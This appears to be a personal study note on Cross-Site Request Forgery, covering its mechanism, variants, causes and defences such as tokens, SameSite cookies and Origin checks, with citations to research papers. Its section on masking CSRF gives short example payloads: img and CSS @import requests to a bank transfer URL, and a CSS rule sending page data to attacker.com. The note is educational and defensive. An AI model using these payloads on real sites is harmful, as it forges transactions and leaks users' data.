---
ID: 2025-02-03-15:11
tags:
  - "#definition"
  - cyberSecurity
  - clientSideAttacks
  - CSFR
---
Also known as XSRF, Confused Deputy, one-click-attack, Session Riding [[(Maes, Heyman, et al., 2009)]].

CSRF can be considered as a subset of [[CSRH (Client-Side Request Hijacking)]]  [[(Khodayari, Barber, et al., 2024)]]

## Context

[[(De Ryck, Desmet, et al., 2010)]]:
HTTP is a stateless client-server protocol, which uses certain methods to transfer data between web servers and browsers. The two most frequently used HTTP methods are GET and POST.
- GET methods are used to fetch data from the server
- POST methods are used to update server state
- In practice however, GET and POST methods are used interchangeably, and both can trigger server-side state changes

Because of the stateless nature of HTTP, session management is built on top of HTTP. This is typically done by means of [[cookie]], which are small amounts of session-specific data, created by the server application and stored in the browser
- This session-specific data is sent back with each request to that particular web application, without any user intervention, to prevent the user from log in at each requests

[[SOP (Same-Origin Policy)]] prevents a website to access the DOM objects or the JavaScript functions of another website, but cannot block POST or GET requests from another website

In a CSRF, a user is logged in a website (`bank.com`) and browses another website (`evil.com`). This last website execute a HTTP request to the first one, for example performing unwanted financial transactions.

## Definition

Cross-Site Request Forgery (CSRF) is an attack that forces an authenticated user to perform an unwanted action on a website they are logged in to, without their knowledge or consent
- This is possible exploiting authentication cookies or [[sessions token]] of the victim [[(Tkachenko et al., 2024)]]
- ==Many websites trust requests from an authenticated browser, without checking whether the user actually intended them==

Even if is called Cross-Site Request Forgery, technically the CSRF attack can be executed withing the same domain, due to a [[XSS (cross site scripting)]] vulnerability or when multiple users can host a web site within the same domain (e.g., universities) [[(Maes, Heyman, et al., 2009)]] [[(De Ryck, Desmet, et al., 2010)]]

### CSRF Mechanism

- The user is logged into a legitimate website (e.g., `bank.com`) and remains authenticated while browsing the internet[^1]. This website must use implicit authentication
- An attacker tricks the user into visiting *another* malicious website[^2] (`evil.com`)
- The malicious website executes code that sends an HTTP request to the previous legitimate website (`bank.com`), exploiting the user's active session
- The browser ==will automatically attach the session cookie to the malicious HTTP request==. Therefore, the attacker does not have even to know it. This is true unless [[SameSite cookie]] are activate, which is only true in Chrome by now.
- Since the user's browser is still authenticated, the legitimate website accepts the request as valid, performing the fraudulent action on behalf of the user

### How can the attacker know what HTTP request to send?

The hacker has to know pretty well the API structure of the target website in order to make the right HTTP request that will, for example, execute an unwanted transaction. This is possible because:
- he is using the website `bank.com` himself, so he can see what API are used
- he has reverse engineered the website's API structure
- he has access to technical documentation of the target website 
- he exploits common pattern such as `POST /update_profile`
- he has access to company documentation, emails, or public discussion forums [[(Felsch, Heiderich, et al., 2015)]]

### How to mask a CSRF even further?

The attack does not even require a JavaScript snippet to be executed. If the server does not check the type of request, is it technically possible to execute a CSRF using GET request implicitly defined in:

- HTML, via  `<img>`, or `<a>` tags [[(Felsch, Heiderich, et al., 2015)]]

```html
<img src="https://banca.com/transfer?amount=5000&to_account=123456">
```

- CSS, using HTML attributes as source of dynamic values [[(Maes, Heyman, et al., 2009)]]

```css
/* it will execute a GET request with parameters */
div[secret-data] {
    background-image: url("https://attacker.com/log?data="attr(secret-data));
}
```

- using the CSS `@import` statement

```css
@import url("https://banca.com/transfer?amount=5000&to_account=123456");
```

### CSRF variants

**Login CSRF** [[(Trampert, Stock, et al., 2023)]]
The attacker forces the victim to log into the attacker’s account on some service. While this may sound counterintuitive initially, it allows the attacker to track their victim’s activities, e.g., following their search history, since that history is now tied to the attacker’s account.

**Reflected CSRF** [[(Shahriar, Zulkernine, et al., 2010)]]
In a reflected CSRF attack, the injected payload is hosted in a web page *other* than a trusted website page. Thus, a victim is exposed to an attack when he logs on to a trusted website and browse to a different website simultaneously (two browsers tabs are therefore open)

**Stored CSRF** [[(Shahriar, Zulkernine, et al., 2010)]]
In a stored CSRF attack, the payload is present as part of a webpage downloaded from a trusted website. These can be found in blogs, forums, and message boards, due to an XSS vulnerability.

**Reverse-XCS based CSRF** [[(Bojinov, Bursztein, et al., 2009)]]
Reverse XCS (a cross-protocol attack that start from a web channel) can be exploited to perform an advanced CSRF that will bypass defenses that rely on [[SOP (Same-Origin Policy)]] or [[CSRF (cross-site request forgery) token]].
- Checking the HTTP header is useless in the context of XCS because the request comes from the same domain
- The use of secure tokens can be defeated by sending an XHR request to the page, reading its result and extracting the token value to construct dynamically the form that will be used to perform the CSRF attack

**TOCHECK: Input validation CSRF** [[(Khodayari, Barber, et al., 2024)]]
- Can bypass common CSRF defenses (e.g., token)

### Risks and consequences

Common CSFR includes:
- changing user's credentials, making the account unusable for the user and stealing his identity
- sending unwanted transactions

Implanting evidence of illegal activities in victim's computer [[(Gelernter, Grinstein, et al., 2015)]]
### Prevalence

Among 5,000 randomly selected scan targets of HTTP requests by Acunetix in 2020, 36% were found vulnerable to CSRF attacks [[(Ramadan, Osama, et al., 2024)]]

750334 requests were analyzed by [[(De Ryck, Desmet, et al., 2010)]]:
 POST requests are a minor part of all the requests (3.74%)
- approximately 24% of the GET requests contain parameters
- very small amount of the GET-requests, especially of the cross-domain GET requests, originate from direct user interaction
- [[cookie]] are a very popular authentication mechanism

### Causes

 [[(Khodayari, Barber, et al., 2024)]]
- the server not being capable of distinguish unintentional from intentional requests
- insufficient input validation at the client side
- stored or reflected [[XSS (cross site scripting)]]  [[(Shahriar, Zulkernine, et al., 2010)]]

Malicious API that can be exploited:
- `XMLHttpRequest`
- `fetch`
- push notification
- web sockets
- server-side events
- [sendBeacon](https://developer.mozilla.org/en-US/docs/Web/API/Navigator/sendBeacon) API (sends POST requests with small payload)

### Mitigation techniques

#### Browser policies

**SOP (same-origin policy)**
 [[SOP (Same-Origin Policy)]] is the first layer of protection, preventing malicious script to directly read cookies or access the DOM of other websites, but it does not prohibit an attacker to launch any arbitrary request to a trusted website [[(Shahriar, Zulkernine, et al., 2010)]]

#### Server-side mitigation

**CSRF Token**
Using [[CSRF (cross-site request forgery) token]], which are in essence random values embedded into form fields.
- If the server does not receive the token that expects, the HTTP request is rejected
- A reverse [[XCS (Cross Channel Scripting)]] based CSRF can bypass a CSRF token [[(Bojinov, Bursztein, et al., 2009)]]

**Source verification (HTTP referrer header)**
Verifying the source of the request (original header) could be a valid mitigation strategy.
- the `referrer` header contains the domain address of a website that initiates a request
- it has been proposed as a solution, but it carries privacy concerns, and therefore is often suppressed by browsers
- The `origin` header is more considerate of privacy but not well supported [[(Pelizzi, Sekar, et al., 2011)]]

**Other mitigation strategies**
- limiting HTTP request methods
- using [[SameSite cookie]] [[(Saleh, Malkawi, et al., 2024)]]
- using [[CORS (Cross-Origin Resource Sharing)]] preflight requests
- closing all the tabs except for the one you are using may be an effective mitigation strategy, but
	1. the website you are visiting is vulnerable to XSS, a request may be executed even in the same domain
	2. if you landed on a malicious website *before* reaching the target, malicious HTTP requests may have been hidden and then executed in the background (this can be done with a [[SW (Service Worker)]])

[[(Khodayari, Barber, et al., 2024)]]:
While  tokens, headers, and cookies in same-site requests are necessary to prevent classical request forgery attacks, they are not sufficient to prevent client-side hijack of requests (from the same origin), because JavaScript programs and web browsers include these tokens, headers, and cookies in same-site requests
In addition, when the request body contains sensitive information, attackers can hijack the request and reroute it to their own domains, thereby setting the CORS response headers to their advantage. A better mitigation strategy should include:
- a robust [[URL validation]]
- [[CSP (Content Security Policy)]]
- [[COOP (Cross-Origin Opener Policy)]]
- [[COEP (Cross-Origin Embedder Policy)]]
- Fetch metadata

**Whitelisting and blacklisting of domain** [[(Shahriar, Zulkernine, et al., 2010)]]
Cross-origin policies (a whitelist of valid URLs) have been proposed, but:
- manual process that can be badly configured and that is error prone
- not scalable and has to be maintained over time
- stored CSRF are not detectable in this way (e.g., CSRF that leverage on a stored XSS and that are lunched each time a user lands to a specific part of an application)

#### Client-side protections

[[(Maes, Heyman, et al., 2009)]], [[(De Ryck, Desmet, et al., 2010)]]
- ==browser extensions and content policies==: RequestPolicy, Browser-Enforced Authenticity Protection (BEAP), CSRF Protector, SOMA[^3], CsFire, Browser Enforced Embedded Policies (BEEP) (uses a server-provided policy to defeat malicious JavaScript. A protection script is injected to validate client-side scripts)
- ==client-side proxy==: **RequestRodeo** (uses a system of tokens to identify legitimate cross-domain requests, protects against IP address based attacks)

Usually these countermeasures monitor outgoing requests and incoming responses, and filter out implicit authentication or block cross-domain requests.

Shortcomings:
- degrading user experience
- degrading application performance
- fail to protect against GET-based CSRF

[[(De Ryck, Desmet, et al., 2010)]]:
- propose to strip all the cookies and the auth headers from cross-domain HTTP requests, except for GET requests with no parameters, explicitly initiated by the user 
- a Firefox extension is proposed, with a server-side possible integration (whitelisting of trusted domains)

#### Why don't we block all the cross-domain request?

- sometimes front-end and back-end live in different domains (e.g., `example.com` is a SPA application written in Vue.js ask requests to a PHP back-end which is a completely different application hosted somewhere else)
- some web applications leverage on public APIs
- third-party services (Stripe, for payments, [[OAuth]] or [[OpenID]] for authentication) are used
- mashup websites (that uses embedded maps or contents) need cross-domain requests to work as intended

---

#### See also

There are similarities between CSRF and [[XSS (cross site scripting)]]. While the XSS is a general abuse of a website leading to malicious script execution, CSRF is focused on performing actions on behalf of an unsuspecting user (see [[XSS and CSFR comparison]]).

#### References
- [[(Tkachenko et al., 2024)]]
- Included in literature review, by [[(Onukrane, Skrodelis, et al., 2023)]]
- Unsystematic and short literature review by [[(Farah, Shojol, et al., 2016)]]
- Server-side mitigation tool jCSRF, by [[(Pelizzi, Sekar, et al., 2011)]]
- Attack simulation, by [[(Saleh, Malkawi, et al., 2024)]]
- client-side defense policies, [[(Maes, Heyman, et al., 2009)]]
- server-side proxy, [[(Liu, Shen, et al., 2020)]]
- ML comparison in CSRF,  [[(Ramadan, Osama, et al., 2024)]]
- client-side detection, by [[(Shahriar, Zulkernine, et al., 2010)]]
- CSRF in embedded web server, by [[(Bojinov, Bursztein, et al., 2009)]]
- CSRH in the wild, by [[(Khodayari, Barber, et al., 2024)]]
- Firefox extension CsFire, by [[(De Ryck, Desmet, et al., 2010)]]

[^1]: For more about authentication mechanisms and session management, see [[cookie]], [[sessions token]], [[JWT (JSON Web Token)]]

[^2]: This can be done in different forms. For example, via a [[phishing]] email, using malicious embedded image or malicious forms in a website vulnerable to [[XSS (cross site scripting)]], exploiting [[clickjacking]] or [[tabnabbing]] attacks

[^3]: A thorough description of browser policies at [[(Stamm, Sterne, et al., 2010)]]
